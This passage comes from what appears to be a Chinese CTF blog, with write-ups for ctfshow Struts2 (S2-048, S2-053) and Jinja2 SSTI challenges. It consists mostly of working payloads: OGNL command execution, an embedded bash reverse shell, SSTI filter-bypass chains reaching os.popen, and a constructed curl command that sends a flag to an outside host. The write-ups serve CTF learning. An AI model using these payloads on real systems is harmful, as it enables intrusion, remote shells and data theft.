title="WEB-295(S2-048)"></a>WEB-295(S2-048)</h1><p>又是showcase了</p><p>原理:</p><p>漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用</p><p>而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击</p><p>影响版本: 2.0.0 - 2.3.32</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963120663-1045940c-f911-4e1d-af71-a1808e8f746d.png" alt="img"></p><p>成功执行</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963158825-e4b7adae-128b-4bdf-b248-2c600091a40c.png" alt="img"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure><p>注入点在第一个栏里</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963566791-1536b3ed-3280-40e4-9a99-55dbe5916d98.png" alt="img"></p><p>flag就是这段 因为它报错不能解析我们的uuid</p><h1 id="WEB-296-S2-052"><a href="#WEB-296-S2-052" class="headerlink" title="WEB-296(S2-052)"></a>WEB-296(S2-052)</h1><p>这题直接用脚本poc打就行了 看好多师傅payload打不了</p><h1 id="WEB-297-S2-053"><a href="#WEB-297-S2-053" class="headerlink" title="WEB-297(S2-053)"></a>WEB-297(S2-053)</h1><p>原理:</p><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><p>直接rce env找不到flag 反弹shell env才有flag 逆天</p><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>也就当作是熟悉了 只是payload的搬运工:)</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-ssti</title>
      <link href="/post/7eb33f7a.html"/>
      <url>/post/7eb33f7a.html</url>
      
        <content type="html"><![CDATA[<p>ctfshow-ssti</p><span id="more"></span><p>感觉这块网上直接找payload之外 没有真正理解答案 重新学习一下 顺便也要适应python了</p><h1 id="WEB-361"><a href="#WEB-361" class="headerlink" title="WEB-361"></a>WEB-361</h1><p>无过滤</p><p>payload:<code>&#123;&#123;().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;</code></p><p>或者用lipsum包和cycler库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;tac ../flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>或者用控制块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% <span class="built_in">print</span>(url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat ../flag&#x27;).read()&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure><h1 id="WEB-362-过滤了os-wrap-close"><a href="#WEB-362-过滤了os-wrap-close" class="headerlink" title="WEB-362(过滤了os.wrap_close)"></a>WEB-362(过滤了os.wrap_close)</h1><p>用上一题的其他方式就行</p><h1 id="WEB-363-过滤单双引号"><a href="#WEB-363-过滤单双引号" class="headerlink" title="WEB-363(过滤单双引号)"></a>WEB-363(过滤单双引号)</h1><p>get传参方式绕过或<code>request.cookies.x</code>都行</p><p>需要注意的是<code>url_for.__builtins__</code>下没有os 但是可以用eval</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(request.args.ocean).read()&#125;&#125;&amp;ocean =cat /flag</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c)&#125;&#125;&amp;a=__builtins__&amp;b=<span class="built_in">eval</span>&amp;c=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>还有就是通过config配置信息截字符 截取到os</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692683423226-16a1cfbb-13c7-49d8-8421-d7d38b39e349.png" alt="img"></p><p><code>?name=&#123;&#123;url_for.__globals__[(config.__str__()[2])%2b(config.__str__()[42])]&#125;&#125;</code>这里需要注意就是<code>%2b</code>是 <code>+</code>的url编码 不加的话就会报错</p><h1 id="WEB-364-过滤了args"><a href="#WEB-364-过滤了args" class="headerlink" title="WEB-364(过滤了args)"></a>WEB-364(过滤了args)</h1><p>也就是我们不能get传参了直接ban了 <code>request.args</code> 其实还可以用cookie</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;</span><br><span class="line">cookie 传参:a=os;b=popen;c=cat /flag</span><br></pre></td></tr></table></figure><p>第二种：</p><p>values可以获取所有参数 绕过args</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.x).read()&#125;&#125;&amp;x=cat /flag</span><br></pre></td></tr></table></figure><h1 id="WEB-365-过滤了方括号"><a href="#WEB-365-过滤了方括号" class="headerlink" title="WEB-365(过滤了方括号)"></a>WEB-365(过滤了方括号)</h1><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload_1"></a>payload_1</h2><p>values传参</p><p>values 没有被过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.x).read()&#125;&#125;&amp;x=cat /flag</span><br></pre></td></tr></table></figure><p>或者cookie都行</p><h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload_2"></a>payload_2</h2><p>字符串拼接</p><p><code>[]</code>可以用<code>.</code>或者<code>__getitem__</code>本质就是它</p><p>其他师傅的脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># anthor:秀儿</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://bbb42674-c33e-4370-b602-c3318e79fa64.challenge.ctf.show/?name=&#123;&#123;config.__str__().__getitem__(%d)&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        r=requests.get(url=url%(i))</span><br><span class="line">        location=r.text.find(<span class="string">&quot;&lt;h3&gt;&quot;</span>)</span><br><span class="line">        word=r.text[location+<span class="number">4</span>:location+<span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> word==j:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;config.__str__().__getitem__(%d) == %s&quot;</span>%(i,j))</span><br><span class="line">            result+=<span class="string">&quot;config.__str__().__getitem__(%d)~&quot;</span>%(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(result[:<span class="built_in">len</span>(result)-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>然后用<code>~</code>连接起来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__.os.popen(config.__str__().__getitem__(<span class="number">22</span>)~config.__str__().__getitem__(<span class="number">40</span>)~config.__str__().__getitem__(<span class="number">23</span>)~config.__str__().__getitem__(<span class="number">7</span>)~config.__str__().__getitem__(<span class="number">279</span>)~config.__str__().__getitem__(<span class="number">4</span>)~config.__str__().__getitem__(<span class="number">41</span>)~config.__str__().__getitem__(<span class="number">40</span>)~config.__str__().__getitem__(<span class="number">6</span>)</span><br><span class="line">).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="WEB-366-过滤了下划线"><a href="#WEB-366-过滤了下划线" class="headerlink" title="WEB-366(过滤了下划线)"></a>WEB-366(过滤了下划线)</h1><p>可以用过滤器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line">cookie:a=__globals__;b=cat /flag</span><br></pre></td></tr></table></figure><h1 id="WEB-367-过滤了os"><a href="#WEB-367-过滤了os" class="headerlink" title="WEB-367(过滤了os)"></a>WEB-367(过滤了os)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure><p><code>lipsum.__globals__.get(os).popen(c=cat /flag)</code>最终构造是这个</p><p>由于<code>[]</code>也是被waf了所以我们可以通过get(os)方式 之前我们都是<code>lipsum.__globals__[&#39;os&#39;]</code></p><p>也算是一个小trick</p><h1 id="WEB-368-过滤了左花括号"><a href="#WEB-368-过滤了左花括号" class="headerlink" title="WEB-368(过滤了左花括号)"></a>WEB-368(过滤了左花括号)</h1><p>用<code>&#123;%print()%&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%<span class="built_in">print</span>((lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read())%&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure><h1 id="WEB-369-过滤了request"><a href="#WEB-369-过滤了request" class="headerlink" title="WEB-369(过滤了request)"></a>WEB-369(过滤了request)</h1><h2 id="payload-1-1"><a href="#payload-1-1" class="headerlink" title="payload_1"></a>payload_1</h2><p>截取配置config构造 这类下划线被ban了 不能用<code>__str()__</code>所以就要用过滤器了</p><p>获取字符串后本来要用<code>__getitem__</code>问题是<code>_</code>被ban了</p><p>所以这里需要转换成list然后用<code>pop()</code>就可以得到我们想要的字符</p><p>师傅们的payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% <span class="built_in">print</span> (lipsum|attr((config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">6</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">41</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">2</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">33</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">40</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">41</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">42</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()</span><br><span class="line">)).get((config|string|<span class="built_in">list</span>).pop(<span class="number">2</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">42</span>).lower()).popen((config|string|<span class="built_in">list</span>).pop(<span class="number">1</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">40</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">23</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">7</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">279</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">4</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">41</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">40</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">6</span>).lower()).read() %&#125;</span><br></pre></td></tr></table></figure><p>可以来剖析一下</p><p>总体是用<code>(config|string|list).pop(下标).lower()</code>这种方式去截取我们想要的字符</p><p>然后转为小写 用<code>~</code>连接起来 这里还是存在那个trick 要用<code>get(&#39;os&#39;)</code>去代替<code>[&#39;os&#39;]</code>因为方括号被ban了</p><h2 id="payload-2-1"><a href="#payload-2-1" class="headerlink" title="payload_2"></a>payload_2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure><p>解释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">构造po=<span class="string">&quot;pop&quot;</span>     <span class="comment">#利用dict()|join拼接得到</span></span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;  <span class="comment">#po=pop</span></span><br><span class="line"> </span><br><span class="line">等效于a=(()|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>),即a等价于下划线_</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125; <span class="comment">#a=_</span></span><br><span class="line"> </span><br><span class="line">构造ini=<span class="string">&quot;___init__&quot;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join()%&#125;<span class="comment">#元组可以一层一层看好理解ini=__init__ 用了两个join</span></span><br><span class="line"> </span><br><span class="line">构造glo=<span class="string">&quot;__globals__&quot;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;</span><br><span class="line"> </span><br><span class="line">构造geti=<span class="string">&quot;__getitem__&quot;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line"> </span><br><span class="line">构造built=<span class="string">&quot;__builtins__&quot;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line"> </span><br><span class="line">调用<span class="built_in">chr</span>()函数  注意这里q取任何值都行 没有特别的意义</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;<span class="comment">#x=q.__init__.globals__.__getitem__(__builtins__)</span></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;<span class="comment">#chr=q.__init__.globals__.__getitem__(__builtins__).chr </span></span><br><span class="line"> </span><br><span class="line">构造file=<span class="string">&#x27;/flag&#x27;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;<span class="comment"># %2b是+ 一定要有</span></span><br></pre></td></tr></table></figure><h1 id="WEB-370-过滤数字"><a href="#WEB-370-过滤数字" class="headerlink" title="WEB-370(过滤数字)"></a>WEB-370(过滤数字)</h1><p>主要思路是就是用count过滤器搭配join计算字符长度获取数字 然后思路和上一题一样</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> num=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> numm=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> x=(()|select|string|<span class="built_in">list</span>).pop(num)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> glob = (x,x,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,x,x)|join %&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> builtins=x~x~(<span class="built_in">dict</span>(builtins=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> c = <span class="built_in">dict</span>(<span class="built_in">chr</span>=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> o = <span class="built_in">dict</span>(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> getitem = x~x~(<span class="built_in">dict</span>(getitem=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="built_in">chr</span> = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> file = <span class="built_in">chr</span>(numm)~<span class="built_in">dict</span>(flag=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>((lipsum|attr(glob)|attr(getitem)(builtins)).<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure><h1 id="WEB-371-过滤print无回显"><a href="#WEB-371-过滤print无回显" class="headerlink" title="WEB-371(过滤print无回显)"></a>WEB-371(过滤print无回显)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/?name=</span><br><span class="line">&#123;%<span class="built_in">set</span> z=<span class="built_in">dict</span>()|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> e=<span class="built_in">dict</span>(a=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ee=<span class="built_in">dict</span>(aa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eee=<span class="built_in">dict</span>(aaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeee=<span class="built_in">dict</span>(aaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeee=<span class="built_in">dict</span>(aaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeee=<span class="built_in">dict</span>(aaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeee=<span class="built_in">dict</span>(aaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeeee=<span class="built_in">dict</span>(aaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> dayu=(()|select|string|<span class="built_in">list</span>).pop()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(()|select|string|<span class="built_in">list</span>).pop(eeeee*ee)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=(()|select|string|<span class="built_in">list</span>).pop(eee*eeeeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> point=(config|string|<span class="built_in">list</span>).pop(eeeeeeeeee*ee*eeeeeeeeee-eeeeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> maohao=(config|string|<span class="built_in">list</span>).pop(ee*eeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiegang=(config|string|<span class="built_in">list</span>).pop(-eeeeeeee*eeeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(xhx,xhx,<span class="built_in">dict</span>(<span class="built_in">globals</span>=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> builtins=(xhx,xhx,<span class="built_in">dict</span>(builtins=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ohs=<span class="built_in">dict</span>(o=z,s=z)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">open</span>=(lipsum|attr(<span class="built_in">globals</span>)).get(builtins).<span class="built_in">open</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> result=<span class="built_in">open</span>((xiegang,<span class="built_in">dict</span>(flag=z)|join)|join).read() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> curlcmd=(<span class="built_in">dict</span>(curl=z)|join,space,<span class="built_in">dict</span>(http=z)|join,maohao,xiegang,xiegang,eeeeeeee,point,e,eee,z,point,eee,eeee,point,eeeee,eee,maohao,eeeeeee,eeeeeee,eeeeeee,eeeeeee,xiegang,result)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> shell=(lipsum|attr(<span class="built_in">globals</span>)).get(ohs).popen(curlcmd) %&#125;</span><br></pre></td></tr></table></figure><p>先构造出数字0-9 然后去截取我们想要的符号 用curl外带flag</p><p>构造出<code>curl http://ip:port/</code></p><p>一开始自己一直在构造bash反弹shell的 构造了老半天 md发现<code>-&amp;</code>截取不到 没有这两个符号 太难过了 不过对过程有了更深的理解了</p><h1 id="WEB-372-过滤了count"><a href="#WEB-372-过滤了count" class="headerlink" title="WEB-372(过滤了count)"></a>WEB-372(过滤了count)</h1><p>用length替换就行了 然后继续curl外带</p><p>和上面payload差不多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/?name=</span><br><span class="line">&#123;%<span class="built_in">set</span> z=<span class="built_in">dict</span>()|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> e=<span class="built_in">dict</span>(a=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ee=<span class="built_in">dict</span>(aa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eee=<span class="built_in">dict</span>(aaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeee=<span class="built_in">dict</span>(aaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeee=<span class="built_in">dict</span>(aaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeee=<span class="built_in">dict</span>(aaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeee=<span class="built_in">dict</span>(aaaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeeee=<span class="built_in">dict</span>(aaaaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeeeeee=<span 